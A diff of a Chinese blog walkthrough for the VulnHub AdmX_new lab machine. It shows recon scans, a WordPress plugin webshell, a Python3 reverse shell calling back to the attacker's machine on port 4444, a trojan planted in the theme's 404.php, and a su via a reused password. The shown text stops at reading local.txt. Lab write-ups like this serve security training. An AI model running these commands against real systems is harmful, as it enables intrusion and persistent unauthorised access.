@@ -1,22 +1,22 @@
 <!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> VulnHub-4-AdmX_new · Patrik's Blog</title><meta name="description" content="VulnHub-4-AdmX_new - Patrik"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="search" type="application/opensearchdescription+xml" href="http://example.com/atom.xml" title="Patrik's Blog"><meta name="generator" content="Hexo 6.1.0"><link rel="alternate" href="/atom.xml" title="Patrik's Blog" type="application/atom+xml">
-</head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="/favicon.png" alt="logo"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">BLOG</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">ARCHIVE</a></li><li class="nav-list-item"><a href="https://github.com/byesec" target="_blank" class="nav-list-link">GITHUB</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">VulnHub-4-AdmX_new</h1><div class="post-info">2022年1月5日</div><div class="post-content"><span id="more"></span>
+</head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="/favicon.png" alt="logo"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">ARCHIVE</a></li><li class="nav-list-item"><a href="https://github.com/byesec" target="_blank" class="nav-list-link">GITHUB</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">VulnHub-4-AdmX_new</h1><div class="post-info">2022年1月5日</div><div class="post-content"><span id="more"></span>
 <blockquote>
 <p>靶机地址: <a target="_blank" rel="noopener" href="https://download.vulnhub.com/admx/AdmX_new.7z">https://download.vulnhub.com/admx/AdmX_new.7z</a><br>难度等级: 中<br>打靶目标: 取得 2 个 flag + root 权限&gt;</p>
 </blockquote>
-<h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><h3 id="1-主机发现"><a href="#1-主机发现" class="headerlink" title="1.主机发现"></a>1.主机发现</h3><pre class="line-numbers language-none"><code class="language-none">sudo nmap -sn 10.0.2.0&#x2F;24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><h3 id="1-主机发现"><a href="#1-主机发现" class="headerlink" title="1.主机发现"></a>1.主机发现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sn 10.0.2.0/24</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117091346386.png" alt="image-20211117091346386"></p>
-<h3 id="2-端口扫描"><a href="#2-端口扫描" class="headerlink" title="2.端口扫描"></a>2.端口扫描</h3><pre class="line-numbers language-none"><code class="language-none">sudo nmap -p- 10.0.2.11<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="2-端口扫描"><a href="#2-端口扫描" class="headerlink" title="2.端口扫描"></a>2.端口扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p- 10.0.2.11</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117091944645.png" alt="image-20211117091944645"></p>
-<h3 id="3-端口服务信息扫描"><a href="#3-端口服务信息扫描" class="headerlink" title="3.端口服务信息扫描"></a>3.端口服务信息扫描</h3><pre class="line-numbers language-none"><code class="language-none">sudo nmap -sV -p80 10.0.2.11<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="3-端口服务信息扫描"><a href="#3-端口服务信息扫描" class="headerlink" title="3.端口服务信息扫描"></a>3.端口服务信息扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sV -p80 10.0.2.11</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117092313209.png" alt="image-20211117092313209"></p>
 <h3 id="4-访问10-0-2-11的80端口页面"><a href="#4-访问10-0-2-11的80端口页面" class="headerlink" title="4.访问10.0.2.11的80端口页面"></a>4.访问10.0.2.11的80端口页面</h3><p>访问：10.0.2.11:80</p>
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117092452624.png" alt="image-20211117092452624"></p>
 <p>是Apache在Ubuntu下的默认页面，没有能够利用的信息</p>
 <h3 id="5-使用feroxbuster目录扫描"><a href="#5-使用feroxbuster目录扫描" class="headerlink" title="5.使用feroxbuster目录扫描"></a>5.使用feroxbuster目录扫描</h3><p>（字典：sudo apt install seclist   较大）</p>
-<pre class="line-numbers language-none"><code class="language-none">feroxbuster --url http:&#x2F;&#x2F;10.0.2.11 -w &#x2F;usr&#x2F;share&#x2F;dirb&#x2F;wordlists&#x2F;common.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">feroxbuster --url http://10.0.2.11 -w /usr/share/dirb/wordlists/common.txt</span><br></pre></td></tr></table></figure>
 
 <p>扫描部分结果如下：</p>
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117093525296.png" alt="image-20211117093525296"></p>
@@ -74,7 +74,7 @@
 <p><a target="_blank" rel="noopener" href="http://10.0.2.11/wordpress/wp-content/plugins/shell.php?cmd=id">http://10.0.2.11/wordpress/wp-content/plugins/shell.php?cmd=id</a></p>
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117143020914.png" alt="image-20211117143020914"></p>
 <p>确定了webshell上传成功，且可执行操作系统命令</p>
-<h5 id="5-2-2-确认目标靶机上可利用的信息-x2F-软件"><a href="#5-2-2-确认目标靶机上可利用的信息-x2F-软件" class="headerlink" title="5.2.2 确认目标靶机上可利用的信息&#x2F;软件"></a>5.2.2 确认目标靶机上可利用的信息&#x2F;软件</h5><h6 id="Kali监听4444端口"><a href="#Kali监听4444端口" class="headerlink" title="Kali监听4444端口"></a>Kali监听4444端口</h6><pre class="line-numbers language-none"><code class="language-none">nc -nvlp 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h5 id="5-2-2-确认目标靶机上可利用的信息-x2F-软件"><a href="#5-2-2-确认目标靶机上可利用的信息-x2F-软件" class="headerlink" title="5.2.2 确认目标靶机上可利用的信息&#x2F;软件"></a>5.2.2 确认目标靶机上可利用的信息&#x2F;软件</h5><h6 id="Kali监听4444端口"><a href="#Kali监听4444端口" class="headerlink" title="Kali监听4444端口"></a>Kali监听4444端口</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 4444</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117143051516.png" alt="image-20211117143051516"></p>
 <h6 id="确定目标靶机是否有nc"><a href="#确定目标靶机是否有nc" class="headerlink" title="确定目标靶机是否有nc"></a>确定目标靶机是否有nc</h6><p>（存在，但本次尝试其他方法）</p>
@@ -83,159 +83,161 @@
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117144328196.png" alt="image-20211117144328196"></p>
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117144402379.png" alt="image-20211117144402379"></p>
 <p>目标靶机存在Python3环境</p>
-<h5 id="5-2-3使用python3反弹shell代码"><a href="#5-2-3使用python3反弹shell代码" class="headerlink" title="5.2.3使用python3反弹shell代码"></a>5.2.3使用python3反弹shell代码</h5><pre class="line-numbers language-none"><code class="language-none">?cmd&#x3D;python3 -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.2.4&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h5 id="5-2-3使用python3反弹shell代码"><a href="#5-2-3使用python3反弹shell代码" class="headerlink" title="5.2.3使用python3反弹shell代码"></a>5.2.3使用python3反弹shell代码</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.2.4&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117145344122.png" alt="image-20211117145344122"></p>
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117145402436.png" alt="image-20211117145402436"></p>
 <p>使用msf 寻找可利用的wordpress exp</p>
-<pre class="line-numbers language-none"><code class="language-none">sudo msfdb run<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo msfdb run</span><br></pre></td></tr></table></figure>
 
-<pre class="line-numbers language-none"><code class="language-none">search wordpress admin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search wordpress admin</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117144658121.png" alt="image-20211117144658121"></p>
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117145600950.png" alt="image-20211117145600950"></p>
-<pre class="line-numbers language-none"><code class="language-none">use 2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use 2</span><br></pre></td></tr></table></figure>
 
-<pre class="line-numbers language-none"><code class="language-none">show options<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure>
 
-<pre class="line-numbers language-none"><code class="language-none">set PASSWORD adam14<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set PASSWORD adam14</span><br></pre></td></tr></table></figure>
 
-<pre class="line-numbers language-none"><code class="language-none">set RHOSTS 10.0.2.11<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set RHOSTS 10.0.2.11</span><br></pre></td></tr></table></figure>
 
-<pre class="line-numbers language-none"><code class="language-none">set TARGETURI &#x2F;wordpress<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set TARGETURI /wordpress</span><br></pre></td></tr></table></figure>
 
-<pre class="line-numbers language-none"><code class="language-none">set USERNAME admin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set USERNAME admin</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117145845194.png" alt="image-20211117145845194"></p>
-<pre class="line-numbers language-none"><code class="language-none">run<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117150025521.png" alt="image-20211117150025521"></p>
 <p>缺点：有些命令不能成功显示</p>
 <h4 id="5-3再次尝试在“主题”插入一句话木马"><a href="#5-3再次尝试在“主题”插入一句话木马" class="headerlink" title="5.3再次尝试在“主题”插入一句话木马"></a>5.3再次尝试在“主题”插入一句话木马</h4><p>回顾之前在Web页面插入一句话木马修改404.php模板失败，那在现已经获得命令行shell的前提下，是否可以尝试手动的添加一句话？</p>
-<pre class="line-numbers language-none"><code class="language-none">cd wp-content<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd wp-content</span><br></pre></td></tr></table></figure>
 
-<pre class="line-numbers language-none"><code class="language-none">cd themes<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd themes</span><br></pre></td></tr></table></figure>
 
-<pre class="line-numbers language-none"><code class="language-none">ls<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117150443652.png" alt="image-20211117150443652"></p>
 <p>再结合页面信息，确定当前主题名为twentytwentyone（404.php在其目录下）</p>
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117150649101.png" alt="image-20211117150649101"></p>
-<pre class="line-numbers language-none"><code class="language-none">cd twentytwentyone<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd twentytwentyone</span><br></pre></td></tr></table></figure>
 
-<pre class="line-numbers language-none"><code class="language-none">ls<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117150806467.png" alt="image-20211117150806467"></p>
-<pre class="line-numbers language-none"><code class="language-none">vi 404.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi 404.php</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117150904611.png" alt="image-20211117150904611"></p>
 <p>试图移动光标发现webshell在交互过程中仍存在不足</p>
 <p>升级webshell（只适用于bash）(此处是第二次复现整理的WP所以未再次退回环境重新截图，请参考代码文字即可)</p>
-<pre class="line-numbers language-none"><code class="language-none">Ctrl+Z<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ctrl+Z</span><br></pre></td></tr></table></figure>
 
-<pre class="line-numbers language-none"><code class="language-none">stty raw -echo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stty raw -echo</span><br></pre></td></tr></table></figure>
 
-<pre class="line-numbers language-none"><code class="language-none">fg #返回之前的连接<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fg #返回之前的连接</span><br></pre></td></tr></table></figure>
 
-<pre class="line-numbers language-none"><code class="language-none">ls<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure>
 
 <p>因为kali是zsh，故要切换为bash</p>
-<pre class="line-numbers language-none"><code class="language-none">ls &#x2F;bin&#x2F;bash  #确定是否有bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls /bin/bash  #确定是否有bash</span><br></pre></td></tr></table></figure>
 
-<pre class="line-numbers language-none"><code class="language-none">sudo chsh -s &#x2F;bin&#x2F;bash #更改root用户
-chsh -s &#x2F;bin&#x2F;bash #更改kali用户
-（根据需要选择）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo chsh -s /bin/bash #更改root用户</span><br><span class="line">chsh -s /bin/bash #更改kali用户</span><br><span class="line">（根据需要选择）</span><br></pre></td></tr></table></figure>
 
 <p>重启后进行确认并监听</p>
 <p>准备重新连接shell</p>
 <p>连接成功</p>
 <p>升级webshell</p>
-<pre class="line-numbers language-none"><code class="language-none">Ctrl+Z<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ctrl+Z</span><br></pre></td></tr></table></figure>
 
-<pre class="line-numbers language-none"><code class="language-none">stty raw -echo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stty raw -echo</span><br></pre></td></tr></table></figure>
 
-<pre class="line-numbers language-none"><code class="language-none">fg #返回之前的连接<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fg #返回之前的连接</span><br></pre></td></tr></table></figure>
 
-<pre class="line-numbers language-none"><code class="language-none">ls<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure>
 
-<pre class="line-numbers language-none"><code class="language-none">export SHELL&#x3D;&#x2F;bin&#x2F;bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export SHELL=/bin/bash</span><br></pre></td></tr></table></figure>
 
-<pre class="line-numbers language-none"><code class="language-none">export TERM&#x3D;screen<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export TERM=screen</span><br></pre></td></tr></table></figure>
 
-<pre class="line-numbers language-none"><code class="language-none">stty rows 38 columns 116<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stty rows 38 columns 116</span><br></pre></td></tr></table></figure>
 
-<pre class="line-numbers language-none"><code class="language-none">reset<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reset</span><br></pre></td></tr></table></figure>
 
 <p>（升级成功 可Tab补全）调小字体后</p>
 <p>在404.php中写入一句话</p>
-<pre class="line-numbers language-none"><code class="language-none">vi wp-content&#x2F;themes&#x2F;twentytwentyone&#x2F;404.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi wp-content/themes/twentytwentyone/404.php</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117152444377.png" alt="image-20211117152444377"></p>
 <p>保存后打开蚁剑进行配置以维持权限稳定</p>
-<pre class="line-numbers language-none"><code class="language-none">Shell:http:&#x2F;&#x2F;10.0.2.11&#x2F;wordpress&#x2F;wp-content&#x2F;themes&#x2F;twentytwentyone&#x2F;404.php
-
-pwd:aa<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Shell:http://10.0.2.11/wordpress/wp-content/themes/twentytwentyone/404.php</span><br><span class="line"></span><br><span class="line">pwd:aa</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117152943835.png" alt="image-20211117152943835"></p>
 <p>成功连接</p>
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117153006539.png" alt="image-20211117153006539"></p>
-<h2 id="三、提权"><a href="#三、提权" class="headerlink" title="三、提权"></a>三、提权</h2><h3 id="1-查看-x2F-etc-x2F-passwd"><a href="#1-查看-x2F-etc-x2F-passwd" class="headerlink" title="1.查看&#x2F;etc&#x2F;passwd"></a>1.查看&#x2F;etc&#x2F;passwd</h3><pre class="line-numbers language-none"><code class="language-none">cat &#x2F;etc&#x2F;passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="三、提权"><a href="#三、提权" class="headerlink" title="三、提权"></a>三、提权</h2><h3 id="1-查看-x2F-etc-x2F-passwd"><a href="#1-查看-x2F-etc-x2F-passwd" class="headerlink" title="1.查看&#x2F;etc&#x2F;passwd"></a>1.查看&#x2F;etc&#x2F;passwd</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117153735618.png" alt="image-20211117153735618"></p>
-<h3 id="2-查看主目录文件内是否有该用户"><a href="#2-查看主目录文件内是否有该用户" class="headerlink" title="2.查看主目录文件内是否有该用户"></a>2.查看主目录文件内是否有该用户</h3><pre class="line-numbers language-none"><code class="language-none">ls &#x2F;home&#x2F;wpadmin&#x2F; -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="2-查看主目录文件内是否有该用户"><a href="#2-查看主目录文件内是否有该用户" class="headerlink" title="2.查看主目录文件内是否有该用户"></a>2.查看主目录文件内是否有该用户</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls /home/wpadmin/ -l</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117153914865.png" alt="image-20211117153914865"></p>
 <p>发现存在local.txt文件，只有wpadmin用户对其有读的权限</p>
-<h3 id="3-查看操作系统内核"><a href="#3-查看操作系统内核" class="headerlink" title="3.查看操作系统内核"></a>3.查看操作系统内核</h3><pre class="line-numbers language-none"><code class="language-none">uname -a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="3-查看操作系统内核"><a href="#3-查看操作系统内核" class="headerlink" title="3.查看操作系统内核"></a>3.查看操作系统内核</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure>
 
 <p>失败</p>
-<h3 id="4-尝试查看当前用户有没有sudo权限"><a href="#4-尝试查看当前用户有没有sudo权限" class="headerlink" title="4.尝试查看当前用户有没有sudo权限"></a>4.尝试查看当前用户有没有sudo权限</h3><pre class="line-numbers language-none"><code class="language-none">sudo -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="4-尝试查看当前用户有没有sudo权限"><a href="#4-尝试查看当前用户有没有sudo权限" class="headerlink" title="4.尝试查看当前用户有没有sudo权限"></a>4.尝试查看当前用户有没有sudo权限</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
 
 <p>失败</p>
-<h3 id="5-查看WordPress的配置文件"><a href="#5-查看WordPress的配置文件" class="headerlink" title="5.查看WordPress的配置文件"></a>5.查看WordPress的配置文件</h3><pre class="line-numbers language-none"><code class="language-none">cd &#x2F;var&#x2F;www&#x2F;html&#x2F;wordpress&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="5-查看WordPress的配置文件"><a href="#5-查看WordPress的配置文件" class="headerlink" title="5.查看WordPress的配置文件"></a>5.查看WordPress的配置文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /var/www/html/wordpress/</span><br></pre></td></tr></table></figure>
 
-<pre class="line-numbers language-none"><code class="language-none">cat wp-config.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat wp-config.php</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117154514825.png" alt="image-20211117154514825"></p>
-<h3 id="6-是否有密码复用的可能性"><a href="#6-是否有密码复用的可能性" class="headerlink" title="6.是否有密码复用的可能性?"></a>6.是否有密码复用的可能性?</h3><pre class="line-numbers language-none"><code class="language-none">ww-data@wp:&#x2F;var&#x2F;www&#x2F;html&#x2F;wordpress$ su wpadmin
-Password: 
-su: Authentication failure<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<h3 id="6-是否有密码复用的可能性"><a href="#6-是否有密码复用的可能性" class="headerlink" title="6.是否有密码复用的可能性?"></a>6.是否有密码复用的可能性?</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ww-data@wp:/var/www/html/wordpress$ su wpadmin</span><br><span class="line">Password: </span><br><span class="line">su: Authentication failure</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117154640760.png" alt="image-20211117154640760"></p>
 <p>失败</p>
-<h3 id="7-尝试登录数据库账号"><a href="#7-尝试登录数据库账号" class="headerlink" title="7.尝试登录数据库账号"></a>7.尝试登录数据库账号</h3><pre class="line-numbers language-none"><code class="language-none">mysql -u admin -p Wp_Admin#123 -D wordpress<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="7-尝试登录数据库账号"><a href="#7-尝试登录数据库账号" class="headerlink" title="7.尝试登录数据库账号"></a>7.尝试登录数据库账号</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u admin -p Wp_Admin#123 -D wordpress</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117154804076.png" alt="image-20211117154804076">失败</p>
-<h3 id="8-尝试是否复用了Web页面的密码"><a href="#8-尝试是否复用了Web页面的密码" class="headerlink" title="8.尝试是否复用了Web页面的密码"></a>8.尝试是否复用了Web页面的密码</h3><pre class="line-numbers language-none"><code class="language-none">su wpadmin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="8-尝试是否复用了Web页面的密码"><a href="#8-尝试是否复用了Web页面的密码" class="headerlink" title="8.尝试是否复用了Web页面的密码"></a>8.尝试是否复用了Web页面的密码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su wpadmin</span><br></pre></td></tr></table></figure>
 
 <p>尝试输入密码adam14</p>
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117154929085.png" alt="image-20211117154929085"></p>
-<pre class="line-numbers language-none"><code class="language-none">cat local.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat local.txt</span><br></pre></td></tr></table></figure>
 
